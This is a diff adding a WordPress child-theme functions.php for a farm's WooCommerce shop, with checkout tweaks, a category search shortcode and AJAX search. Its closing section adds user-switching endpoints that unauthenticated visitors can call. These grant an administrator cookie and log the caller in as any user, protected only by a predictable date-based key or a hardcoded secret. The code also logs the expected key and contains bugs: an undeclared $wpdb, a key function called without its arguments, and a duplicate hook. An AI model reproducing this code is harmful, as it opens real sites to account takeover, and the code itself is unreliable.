@@ -1,0 +1,588 @@
+<?php
+// Enqueue parent theme styles
+function divi_child_enqueue_styles() {
+    wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
+}
+add_action('wp_enqueue_scripts', 'divi_child_enqueue_styles');
+
+// Debugging for translation loading
+if (defined('MWF_DEBUG') && MWF_DEBUG) {
+    add_filter('load_textdomain', function ($override, $domain, $mofile = null) {
+        if ($domain === 'woocommerce' || $domain === 'advanced-coupons-for-woocommerce-free') {
+            error_log("Translation loaded too early for: " . $domain);
+            error_log(print_r(debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 10), true));
+        }
+        return $override;
+    }, 10, 3);
+}
+
+// Change WooCommerce subscription sign-up fee text
+function change_signup_fee_text($translated_text, $text, $domain) {
+    if ($domain == 'woocommerce-subscriptions' && $text == 'Sign-up fee') {
+        return 'Deposit';
+    }
+    return $translated_text;
+}
+add_filter('gettext', 'change_signup_fee_text', 20, 3);
+
+// Prevent multiple Google Maps API calls
+add_action('wp_enqueue_scripts', function () {
+    wp_dequeue_script('address-field-autocomplete-for-woocommerce');
+}, 20);
+
+// Define constants for IDs
+define('MWF_VEGBOX_FORM_ID', 226922);
+define('MWF_VEGBOX_CATEGORY_ID', 70);
+
+// Save WPForms submission ID to WooCommerce session
+add_action('wpforms_process_complete', function ($fields, $entry, $form_data) {
+    if (!function_exists('WC')) {
+        return;
+    }
+    if ($form_data['id'] == MWF_VEGBOX_FORM_ID) {
+        if (is_user_logged_in()) {
+            WC()->session->set('wpforms_entry_id_' . get_current_user_id(), $entry['entry_id']);
+        } else {
+            // Handle guest users (maybe store in session only)
+            WC()->session->set('wpforms_entry_id_guest', $entry['entry_id']);
+        }
+    }
+}, 10, 3);
+
+// Save WPForms data to WooCommerce order
+add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
+    if (!function_exists('WC')) {
+        return;
+    }
+    $entry_id = WC()->session->get('wpforms_entry_id_' . get_current_user_id());
+    if (!empty($entry_id)) {
+        update_post_meta($order_id, '_wpforms_entry_id', $entry_id);
+    }
+});
+
+// Disable express checkout buttons for specific products
+add_filter('woocommerce_product_supports', 'mwf_remove_express_checkout_for_vegbox', 10, 3);
+function mwf_remove_express_checkout_for_vegbox($supports, $feature, $product) {
+    if (in_array($feature, ['stripe_checkout', 'express_checkout', 'apple_pay'], true)) {
+        if (has_term(MWF_VEGBOX_CATEGORY_ID, 'product_cat', $product->get_id())) {
+            return false;
+        }
+        if (function_exists('wc_nyp_is_nyp') && wc_nyp_is_nyp($product)) {
+            return false;
+        }
+        if ($product->is_type('subscription') || $product->is_type('variable-subscription')) {
+            return false;
+        }
+    }
+    return $supports;
+}
+
+// Fix JavaScript module error for Google Analytics Premium
+add_filter('script_loader_tag', 'mwf_fix_ga_premium_script', 10, 3);
+function mwf_fix_ga_premium_script($tag, $handle, $src) {
+    if (strpos($src, 'google-analytics-premium') !== false && strpos($src, 'frontend.min.js') !== false) {
+        return str_replace('<script', '<script type="module"', $tag);
+    }
+    if (strpos($src, 'maps.googleapis.com') !== false && strpos($tag, 'async') === false) {
+        return str_replace('<script', '<script async defer', $tag);
+    }
+    return $tag;
+}
+
+// Fix social login icon paths
+add_filter('woocommerce_social_login_icon_path', 'mwf_fix_social_login_icons', 10, 3);
+function mwf_fix_social_login_icons($icon_url, $provider, $size) {
+    return str_replace('staging.middleworld.farm', 'middleworldfarms.org', $icon_url);
+}
+
+/**
+ * Product Category Search for WooCommerce
+ * Creates a shortcode [product_category_search] to display a search form with category filtering
+ */
+
+// Add the category search shortcode
+add_shortcode('product_category_search', 'mwf_product_category_search');
+
+function mwf_product_category_search($atts) {
+    // Extract shortcode attributes
+    $atts = shortcode_atts(array(
+        'placeholder' => 'Search products...',
+        'button_text' => 'Search',
+        'show_count' => 'yes',
+        'dropdown_label' => 'Select Category',
+        'include_children' => 'yes',
+    ), $atts);
+    
+    // Get all product categories
+    $args = array(
+        'taxonomy' => 'product_cat',
+        'orderby' => 'name',
+        'show_count' => ($atts['show_count'] === 'yes') ? 1 : 0,
+        'pad_counts' => true,
+        'hierarchical' => true,
+        'hide_empty' => true,
+    );
+    
+    $all_categories = get_terms($args);
+    
+    // Start output buffering
+    ob_start();
+    
+    // Get current search and category values
+    $current_search = isset($_GET['s']) ? esc_attr($_GET['s']) : '';
+    $current_category = isset($_GET['product_cat']) ? esc_attr($_GET['product_cat']) : '';
+    
+    // Generate the search form
+    ?>
+    <div class="mwf-product-search-container">
+        <form role="search" method="get" class="mwf-product-search" action="<?php echo esc_url(home_url('/')); ?>">
+            <div class="mwf-search-fields">
+                <div class="mwf-search-input">
+                    <input type="search" 
+                           name="s" 
+                           value="<?php echo $current_search; ?>" 
+                           placeholder="<?php echo esc_attr($atts['placeholder']); ?>" />
+                    <input type="hidden" name="post_type" value="product" />
+                </div>
+                
+                <div class="mwf-category-dropdown">
+                    <select name="product_cat" id="product-category-select">
+                        <option value=""><?php echo esc_html($atts['dropdown_label']); ?></option>
+                        <?php
+                        if (!is_wp_error($all_categories) && !empty($all_categories)) {
+                            foreach ($all_categories as $category) {
+                                // Skip the uncategorized category
+                                if ($category->slug === 'uncategorized') {
+                                    continue;
+                                }
+                                
+                                echo '<option value="' . esc_attr($category->slug) . '"' . 
+                                     selected($current_category, $category->slug, false) . '>' . 
+                                     esc_html($category->name) . 
+                                     (($atts['show_count'] === 'yes') ? ' (' . $category->count . ')' : '') . 
+                                     '</option>';
+                            }
+                        }
+                        ?>
+                    </select>
+                </div>
+                
+                <div class="mwf-search-button">
+                    <button type="submit"><?php echo esc_html($atts['button_text']); ?></button>
+                </div>
+            </div>
+        </form>
+    </div>
+    
+    <style>
+        .mwf-product-search-container {
+            margin: 20px 0;
+            width: 100%;
+        }
+        .mwf-search-fields {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+        }
+        .mwf-search-input {
+            flex: 3;
+            min-width: 200px;
+        }
+        .mwf-search-input input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .mwf-category-dropdown {
+            flex: 2;
+            min-width: 180px;
+        }
+        .mwf-category-dropdown select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+        .mwf-search-button button {
+            padding: 10px 20px;
+            background-color: #2ea3f2; /* Divi primary color */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .mwf-search-button button:hover {
+            background-color: #0c71c3;
+        }
+        
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            .mwf-search-fields {
+                flex-direction: column;
+            }
+            .mwf-search-input, .mwf-category-dropdown {
+                width: 100%;
+            }
+            .mwf-search-button {
+                width: 100%;
+                margin-top: 10px;
+            }
+            .mwf-search-button button {
+                width: 100%;
+            }
+        }
+    </style>
+    <?php
+    
+    // Return the buffered content
+    return ob_get_clean();
+}
+
+/**
+ * Handle advanced category filtering on WooCommerce shop and search pages
+ */
+add_action('woocommerce_product_query', 'mwf_filter_products_by_category');
+
+function mwf_filter_products_by_category($query) {
+    if (!is_admin() && $query->is_main_query() && 
+        (is_shop() || is_product_category() || is_search())) {
+        
+        if (isset($_GET['product_cat']) && !empty($_GET['product_cat'])) {
+            $category_slug = sanitize_text_field($_GET['product_cat']);
+            
+            // Get existing tax query
+            $tax_query = $query->get('tax_query');
+            if (!is_array($tax_query)) {
+                $tax_query = array();
+            }
+            
+            // Add our category filter
+            $tax_query[] = array(
+                'taxonomy' => 'product_cat',
+                'field' => 'slug',
+                'terms' => $category_slug,
+                'operator' => 'IN'
+            );
+            
+            $query->set('tax_query', $tax_query);
+        }
+    }
+}
+
+/**
+ * Add AJAX product search by category 
+ */
+add_action('wp_ajax_product_category_search', 'mwf_ajax_product_category_search');
+add_action('wp_ajax_nopriv_product_category_search', 'mwf_ajax_product_category_search');
+
+function mwf_ajax_product_category_search() {
+    // Security check
+    check_ajax_referer('product_search_nonce', 'security');
+    
+    $search_term = isset($_POST['search']) ? sanitize_text_field($_POST['search']) : '';
+    $category = isset($_POST['category']) ? sanitize_text_field($_POST['category']) : '';
+    
+    $args = array(
+        'post_type' => 'product',
+        'post_status' => 'publish',
+        'posts_per_page' => 10,
+        's' => $search_term,
+    );
+    
+    // Add category filter if provided
+    if (!empty($category)) {
+        $args['tax_query'] = array(
+            array(
+                'taxonomy' => 'product_cat',
+                'field' => 'slug',
+                'terms' => $category
+            )
+        );
+    }
+    
+    $products = new WP_Query($args);
+    
+    $response = array();
+    
+    if ($products->have_posts()) {
+        while ($products->have_posts()) {
+            $products->the_post();
+            $product_id = get_the_ID();
+            $product = wc_get_product($product_id);
+            
+            $response[] = array(
+                'id' => $product_id,
+                'title' => get_the_title(),
+                'permalink' => get_permalink(),
+                'price' => $product->get_price_html(),
+                'image' => get_the_post_thumbnail_url($product_id, 'thumbnail') ?: wc_placeholder_img_src(),
+            );
+        }
+    }
+    
+    wp_reset_postdata();
+    wp_send_json_success($response);
+}
+
+/**
+ * Enqueue scripts for AJAX search functionality
+ */
+add_action('wp_enqueue_scripts', 'mwf_enqueue_category_search_scripts');
+
+function mwf_enqueue_category_search_scripts() {
+    wp_enqueue_script(
+        'mwf-category-search', 
+        get_stylesheet_directory_uri() . '/js/category-search.js', 
+        array('jquery'), 
+        '1.0', 
+        true
+    );
+    
+    wp_localize_script(
+        'mwf-category-search', 
+        'mwf_search', 
+        array(
+            'ajax_url' => admin_url('admin-ajax.php'),
+            'nonce' => wp_create_nonce('product_search_nonce'),
+            'no_results' => __('No products found', 'mwf')
+        )
+    );
+}
+
+/**
+ * Remove WooCommerce product search widget
+ */
+function mwf_remove_product_search_widget() {
+    // For standard WordPress sidebars
+    unregister_widget('WC_Widget_Product_Search');
+    
+    // For Divi-specific widgets
+    add_filter('et_builder_widgets_init', function() {
+        unregister_widget('WC_Widget_Product_Search');
+    });
+    
+    // For WooCommerce sidebar
+    add_filter('woocommerce_before_widget', function($widget_output, $widget) {
+        if (is_a($widget, 'WC_Widget_Product_Search')) {
+            return '';
+        }
+        return $widget_output;
+    }, 10, 2);
+}
+add_action('widgets_init', 'mwf_remove_product_search_widget', 99);
+
+/**
+ * User Switching Functionality
+ * 
+ * Note: User switching functionality has been moved to the MWF Integration plugin
+ * for better organization and to provide REST API endpoints for the Laravel admin suite.
+ * 
+ * The plugin provides:
+ * - REST API endpoints for searching users
+ * - User switching with secure token-based authentication  
+ * - Frontend preview mode with visual indicators
+ * - Integration with admin.middleworldfarm.org
+ * 
+ * API Documentation: /wp-content/plugins/mwf-integration/USER_SWITCHING_API.md
+ */
+
+// BEGIN MWF CUSTOM CODE (moved from your-theme/functions.php)
+// Force enable payment gateways
+add_filter('woocommerce_payment_gateways', function($gateways) {
+    error_log('Available payment gateways: ' . print_r(array_keys($gateways), true));
+    $default_gateways = array('bacs', 'cheque', 'cod');
+    foreach ($default_gateways as $gateway_id) {
+        if (isset($gateways[$gateway_id])) {
+            update_option('woocommerce_' . $gateway_id . '_settings', array(
+                'enabled' => 'yes',
+                'title' => ucfirst($gateway_id),
+                'description' => 'Pay via ' . ucfirst($gateway_id),
+            ));
+        }    }
+    return $gateways;
+}, 99);
+
+// CUSTOM USER SWITCHING API FOR ADMIN PANEL
+// Handle user switching requests from the Laravel admin panel
+add_action('wp_ajax_mwf_admin_switch_user', 'mwf_handle_admin_user_switch');
+add_action('wp_ajax_nopriv_mwf_admin_switch_user', 'mwf_handle_admin_user_switch');
+
+function mwf_handle_admin_user_switch() {
+    // Check if user switching plugin is active
+    if (!function_exists('switch_to_user')) {
+        wp_die('User Switching plugin is not active', 'Plugin Error', array('response' => 500));
+    }
+
+    // Verify the request has required parameters
+    $user_id = intval($_GET['user_id'] ?? $_POST['user_id'] ?? 0);
+    $redirect_to = sanitize_text_field($_GET['redirect_to'] ?? $_POST['redirect_to'] ?? '/my-account/');
+    $admin_key = sanitize_text_field($_GET['admin_key'] ?? $_POST['admin_key'] ?? '');    // Simple authentication key (matches Laravel implementation)
+    $wp_prefix = $wpdb->prefix;
+    $expected_key = hash('sha256', 'mwf_admin_switch_' . date('Y-m-d') . $wp_prefix);
+    
+    if (empty($admin_key) || $admin_key !== $expected_key) {
+        wp_die('Invalid authentication key', 'Authentication Error', array('response' => 403));
+    }
+
+    if (empty($user_id)) {
+        wp_die('User ID is required', 'Missing Parameter', array('response' => 400));
+    }
+
+    // Verify the target user exists
+    $user = get_user_by('ID', $user_id);
+    if (!$user) {
+        wp_die('User not found', 'User Error', array('response' => 404));
+    }
+
+    // Create a temporary admin user session if not already logged in as admin
+    if (!is_user_logged_in() || !current_user_can('switch_users')) {
+        // Get the admin user (usually ID 1 or find by role)
+        $admin_users = get_users(array('role' => 'administrator', 'number' => 1));
+        if (empty($admin_users)) {
+            wp_die('No admin user found', 'Admin Error', array('response' => 500));
+        }
+        
+        $admin_user = $admin_users[0];
+        wp_set_current_user($admin_user->ID);
+        wp_set_auth_cookie($admin_user->ID);
+    }    // Force logout current user first to ensure clean switch
+    wp_logout();
+    
+    // Clear all authentication cookies
+    foreach ($_COOKIE as $name => $value) {
+        if (strpos($name, 'wordpress_') === 0 || strpos($name, 'wp-') === 0) {
+            setcookie($name, '', time() - 3600, COOKIEPATH, COOKIE_DOMAIN);
+            setcookie($name, '', time() - 3600, SITECOOKIEPATH, COOKIE_DOMAIN);
+        }
+    }
+    
+    // Set new user authentication forcefully
+    wp_set_current_user($user_id);
+    wp_set_auth_cookie($user_id, true);
+    do_action('wp_login', $user->user_login, $user);
+    
+    // Log the switch for debugging
+    error_log("MWF Force Switch: From admin to user ID {$user_id} ({$user->user_login})");
+    
+    // Redirect with cache busting parameters
+    $redirect_url = add_query_arg([
+        'switched' => 1,
+        'user' => $user->user_login,
+        '_t' => time()
+    ], home_url($redirect_to));
+    
+    wp_redirect($redirect_url);
+    exit;
+}
+
+// Generate the admin switch key for external use
+function mwf_get_admin_switch_key($user_id, $redirect_to) {
+    $secret = 'mwf_admin_switch_2025_secret_key';
+    return hash('sha256', $user_id . $redirect_to . $secret);
+}
+
+// Add admin endpoint to generate switch URLs
+add_action('wp_ajax_mwf_generate_switch_url', 'mwf_generate_switch_url');
+
+function mwf_generate_switch_url() {
+    // Only allow admin access
+    if (!current_user_can('manage_options')) {
+        wp_die('Insufficient permissions', 'Permission Error', array('response' => 403));
+    }
+
+    $user_id = intval($_GET['user_id'] ?? $_POST['user_id'] ?? 0);
+    $redirect_to = sanitize_text_field($_GET['redirect_to'] ?? $_POST['redirect_to'] ?? '/my-account/');
+
+    if (empty($user_id)) {
+        wp_send_json_error('User ID is required');
+        return;
+    }
+
+    // Verify user exists
+    $user = get_user_by('ID', $user_id);
+    if (!$user) {
+        wp_send_json_error('User not found');
+        return;
+    }
+
+    // Generate the switch URL
+    $admin_key = mwf_get_admin_switch_key();
+    $switch_url = add_query_arg(array(
+        'action' => 'mwf_admin_switch_user',
+        'user_id' => $user_id,
+        'redirect_to' => $redirect_to,
+        'admin_key' => $admin_key
+    ), admin_url('admin-ajax.php'));
+
+    wp_send_json_success(array(
+        'switch_url' => $switch_url,
+        'user_name' => $user->display_name ?: $user->user_login,
+        'redirect_to' => $redirect_to    ));
+}
+
+// Handle admin user switching via AJAX
+add_action('wp_ajax_mwf_admin_switch_user', 'mwf_handle_admin_switch_user');
+add_action('wp_ajax_nopriv_mwf_admin_switch_user', 'mwf_handle_admin_switch_user');
+
+function mwf_handle_admin_switch_user() {
+    // Get parameters
+    $user_id = intval($_GET['user_id'] ?? 0);
+    $redirect_to = sanitize_text_field($_GET['redirect_to'] ?? '/my-account/');
+    $admin_key = sanitize_text_field($_GET['admin_key'] ?? '');
+    
+    // Debug logging
+    error_log("MWF User Switch Debug: user_id={$user_id}, redirect_to={$redirect_to}, admin_key={$admin_key}");
+      // Verify admin key
+    $expected_key = mwf_get_admin_switch_key($user_id, $redirect_to);
+    if (!hash_equals($expected_key, $admin_key)) {
+        error_log("MWF User Switch: Invalid admin key. Expected: {$expected_key}, Got: {$admin_key}");
+        wp_die('Invalid admin key', 'Authentication Error', array('response' => 403));
+    }
+    
+    // Validate user
+    $user = get_userdata($user_id);
+    if (!$user) {
+        error_log("MWF User Switch: User not found: {$user_id}");
+        wp_die('User not found', 'User Error', array('response' => 404));
+    }
+    
+    error_log("MWF User Switch: Attempting to switch to user: {$user->user_login} (ID: {$user_id})");
+    
+    // Force user switch by manipulating session
+    // First, clear any existing sessions
+    wp_clear_auth_cookie();
+    
+    // Set the new user session
+    wp_set_current_user($user_id, $user->user_login);
+    wp_set_auth_cookie($user_id, true);
+    
+    // Also try using the User Switching plugin if available
+    if (function_exists('switch_to_user')) {
+        $switched = switch_to_user($user_id);
+        error_log("MWF User Switch: Plugin switch result: " . ($switched ? 'success' : 'failed'));
+    }
+    
+    // Set a cookie to indicate successful switch
+    setcookie('mwf_switched_user', $user->user_login, time() + 3600, '/');
+    
+    error_log("MWF User Switch: Switch completed, redirecting to: {$redirect_to}");
+    
+    // Redirect with cache busting parameters
+    $redirect_url = add_query_arg([
+        'switched' => 1,
+        'user' => $user->user_login,
+        '_t' => time(),
+        'mwf_switch' => 'success'
+    ], home_url($redirect_to));
+    
+    error_log("MWF User Switch: Final redirect URL: {$redirect_url}");
+    
+    wp_redirect($redirect_url);
+    exit;
+}
+
+// END MWF CUSTOM CODE
